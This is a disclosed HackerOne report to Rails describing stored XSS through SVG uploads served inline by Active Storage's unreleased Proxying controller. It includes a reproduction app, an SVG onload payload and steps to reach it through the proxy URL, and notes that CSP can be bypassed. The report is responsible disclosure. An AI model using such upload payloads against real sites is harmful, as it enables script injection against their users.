# XSS by file (Active Storage `Proxying`)

## Report Details
- **Report ID**: 949513
- **URL**: https://hackerone.com/reports/949513
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-08-02T05:13:31.245Z
- **Disclosed**: 2020-09-01T22:51:37.236Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
Hello,
I've seen similar issues with #407319 and #429868 occur with Active Storage's new File serving strategies `Proxying`.

Commit is https://github.com/rails/rails/commit/dfb5a82b259e134eac89784ac4ace0c44d1b4aee.

```ruby
# https://github.com/rails/rails/blob/master/activestorage/app/controllers/concerns/active_storage/set_headers.rb#L9
      response.headers["Content-Disposition"] = ActionDispatch::Http::ContentDisposition.format \
        disposition: params[:disposition] || "inline", filename: blob.filename.
```

```ruby
# https://github.com/rails/rails/blob/master/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb

# Proxy files through application. This avoids having a redirect and makes files easier to cache.
class ActiveStorage::Blobs::ProxyController < ActiveStorage::BaseController
  include ActiveStorage::SetBlob
  include ActiveStorage::SetHeaders

  def show
    http_cache_forever public: true do
      set_content_headers_from @blob
      stream @blob
    end
  end
end  
```

Since `inline` can be set regardless of the file type, XSS is possible when a malicious file is uploaded.

### Proof of concept

#### 1. Preparing the server

```
$ rails new proxy_xss --skip-bundle --skip-webpack-install
$ cd proxy_xss/
```

Edit Gemfile.

```ruby
source 'https://rubygems.org'
git_source(:github) { |repo| "https://github.com/#{repo}.git" }

ruby '2.7.1'

gem 'rails', github: "rails/rails", branch: "master"
gem 'sqlite3', '~> 1.4'
gem 'puma', '~> 4.1'

gem 'bootsnap', '>= 1.4.2', require: false

group :development do
  gem 'listen', '~> 3.2'
end
```

```
$ bundle install
...

$ head Gemfile.lock
GIT
  remote: https://github.com/rails/rails.git
  revision: 11f54e12b992f6c8d29fd9bedd89ac438a928a2f
  branch: master
  specs:
    actioncable (6.1.0.alpha)
      actionpack (= 6.1.0.alpha)
      activesupport (= 6.1.0.alpha)
      nio4r (~> 2.0)
      websocket-driver (>= 0.6.1)
```

```
$ bundle exec rails active_storage:install
$ bundle exec rails g resource user name:text
$ bundle exec rails db:migrate
```

Edit app files.

```ruby
# controllers/users_controller.rb
class UsersController < ApplicationController

  def new
    @user = User.new
  end

  def create
    user = User.create!(user_params)
    redirect_to "/users/#{user.id}"
  end

  def show
    @user = User.find(params[:id])
  end

  private
    def user_params
      params.require(:user).permit(:name, :image)
    end
end
```

```ruby
# models/user.rb
class User < ApplicationRecord
  has_one_attached :image
end
```

```erb
# views/layouts/application.html.erb
<!DOCTYPE html>
<html>
  <head>
    <title>ProxyXss</title>
    <%= csrf_meta_tags %>
    <%= csp_meta_tag %>
  </head>

  <body>
    <%= yield %>
  </body>
</html>
```

```erb
# views/user/new.html.erb
<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>
  <%= form.text_area :name %><br>
  <%= form.file_field :image %><br>
  <%= form.submit %>
<% end %>
```

```erb
# views/user/show.html.erb
<% if @user.image.attached? %>
  <%= image_tag @user.image %>
<% end %>
```

#### 2. Obtain url

Start server.

```
rails s
```

Open `http://localhost:3000/users/new` in your browser, Upload the following file as `alert.svg`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns='http://www.w3.org/2000/svg' width="200px" height="200px" onload="javascript:alert(location)">
</svg>
```

After that, use the developer tool to obtain the redirected URL.

```
http://localhost:3000/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg
```

#### 3. XSS

Rewrite `redirect` in URL to `proxy` and alert will appear when opening URL directly in browser.

```
http://localhost:3000/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg
```

{F933309}

## Impact

XSS is possible if attacker can upload files using Active storage.
This commit has not been released yet, so it only affects services using Rails on the master branch.
(Maybe `Hey` etc. https://gist.github.com/dhh/782fb925b57450da28c1e15656779556#file-gemfile-L3)

In addition, since the csp header is not output for the svg file (https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/http/content_security_policy.rb#L20), it can be avoided even if csp is set.

## Attachments
- __________2020-08-02_13.56.07.png
